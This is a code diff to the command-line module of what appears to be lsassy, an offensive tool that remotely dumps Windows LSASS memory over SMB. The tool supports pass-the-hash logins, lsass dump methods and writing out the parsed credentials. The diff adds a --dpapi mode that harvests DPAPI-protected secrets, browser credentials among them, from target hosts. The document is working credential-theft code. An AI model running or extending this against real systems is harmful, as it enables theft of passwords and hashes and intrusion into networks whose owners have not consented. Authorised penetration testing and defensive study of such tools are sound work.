@@ -2,8 +2,14 @@ import sys
 import argparse
 import logging
 from threading import Thread, RLock
+
+from lsassy.dpapi.config.module_management import get_categories
+
+from lsassy.dpapi.recon import Recon
+from lsassy.dpapi.module.firefox import Mozilla
 from lsassy import logger
 from lsassy.utils import get_targets
+from lsassy.harvester import Harvester
 from lsassy.parser import Parser
 from lsassy.session import Session
 from lsassy.writer import Writer
@@ -27,6 +33,7 @@ class TLsassy(Thread):
         """
         Main method to dump credentials on a remote host
         """
+        file, dumper, session = None, None, None
         try:
             # Credential parsing
             username = self.args.username if self.args.username else ""
@@ -42,22 +49,6 @@ class TLsassy(Thread):
                     lmhash, nthash = self.args.hashes.split(":")
                 else:
                     lmhash, nthash = 'aad3b435b51404eeaad3b435b51404ee', self.args.hashes
-
-            # Exec methods parsing
-            exec_methods = self.args.exec.split(",") if self.args.exec else None
-
-            # Dump modules options parsing
-            options = {v.split("=")[0]: v.split("=")[1] for v in self.args.options.split(",")} if self.args.options else {}
-
-            # Dump path checks
-            dump_path = self.args.dump_path
-            if dump_path and len(dump_path) > 1 and dump_path[1] == ":":
-                if dump_path[0] != "C":
-                    logging.error("Drive '{}' is not supported. 'C' drive only.".format(dump_path[0]))
-                    exit(1)
-                dump_path = dump_path[2:]
-            if dump_path and dump_path[-1] != "\\":
-                dump_path += "\\"
 
             session = Session()
             session.get_session(
@@ -77,31 +68,62 @@ class TLsassy(Thread):
             if session.smb_session is None:
                 exit(1)
 
-            dumper = Dumper(session).load(self.args.dump_method)
-            if dumper is None:
-                logging.error("Unable to load dump module")
-                exit(1)
+            if self.args.dpapi:
+                categories = self.args.categories.split(",") if self.args.categories else None
+                harvester = Harvester(session)
+                credentials = harvester.harvest(categories=categories)
+                if credentials is None:
+                    logging.error("Unable to extract credentials from dpapi.")
+                else:
+                    with lock:
+                        Writer(credentials).write(
+                            self.args.format,
+                            output_file=self.args.outfile,
+                            quiet=self.args.quiet,
+                            dpapi=True
+                        )
+            else:
+                # Exec methods parsing
+                exec_methods = self.args.exec.split(",") if self.args.exec else None
 
-            file = dumper.dump(no_powershell=self.args.no_powershell, exec_methods=exec_methods, dump_path=dump_path,
-                               dump_name=self.args.dump_name, **options)
+                # Dump modules options parsing
+                options = {v.split("=")[0]: v.split("=")[1] for v in self.args.options.split(",")} if self.args.options else {}
 
-            if file is None:
-                logging.error("Unable to dump lsass.")
-                exit(1)
+                # Dump path checks
+                dump_path = self.args.dump_path
+                if dump_path and len(dump_path) > 1 and dump_path[1] == ":":
+                    if dump_path[0] != "C":
+                        logging.error("Drive '{}' is not supported. 'C' drive only.".format(dump_path[0]))
+                        exit(1)
+                    dump_path = dump_path[2:]
+                if dump_path and dump_path[-1] != "\\":
+                    dump_path += "\\"
 
-            credentials = Parser(file).parse()
+                dumper = Dumper(session).load(self.args.dump_method)
+                if dumper is None:
+                    logging.error("Unable to load dump module")
+                    exit(1)
 
-            if credentials is None:
-                logging.error("Unable to extract credentials from lsass. Cleaning.")
-                exit(1)
+                file = dumper.dump(no_powershell=self.args.no_powershell, exec_methods=exec_methods, dump_path=dump_path,
+                                   dump_name=self.args.dump_name, **options)
 
-            with lock:
-                Writer(credentials).write(
-                    self.args.format,
-                    output_file=self.args.outfile,
-                    quiet=self.args.quiet,
-                    users_only=self.args.users
-                )
+                if file is None:
+                    logging.error("Unable to dump lsass.")
+                    exit(1)
+
+                credentials = Parser(file).parse()
+
+                if credentials is None:
+                    logging.error("Unable to extract credentials from lsass. Cleaning.")
+                    exit(1)
+
+                with lock:
+                    Writer(credentials).write(
+                        self.args.format,
+                        output_file=self.args.outfile,
+                        quiet=self.args.quiet,
+                        users_only=self.args.users
+                    )
         except Exception as e:
             logging.error("An unknown error has occurred.", exc_info=True)
         finally:
@@ -114,8 +136,9 @@ class TLsassy(Thread):
                 logging.debug("Lsass dump removed")
 
             if session is not None:
-                session.smb_session.close()
-                logging.debug("SMB session closed")
+                if session.smb_session is not None:
+                    session.smb_session.close()
+                    logging.debug("SMB session closed")
 
 
 def run():
@@ -129,6 +152,8 @@ def run():
     )
 
     group_dump = parser.add_argument_group('dump')
+    group_dump.add_argument('--dpapi', action='store_true', help="Extract DPAPI credentials")
+    group_dump.add_argument('-c', '--categories', action='store', help="Categories to dump ({})".format(",".join(get_categories().keys())))
     group_dump.add_argument('-m', '--dump-method', action='store', default="comsvcs", help="Dumping method ({})".format(",".join(Dumper.list())))
     group_dump.add_argument('--dump-path', action='store', help='Path to store lsass dumpfile (Default: \\Windows\\Temp)')
     group_dump.add_argument('--dump-name', action='store', help='Name given to lsass dumpfile (Default: Random)')
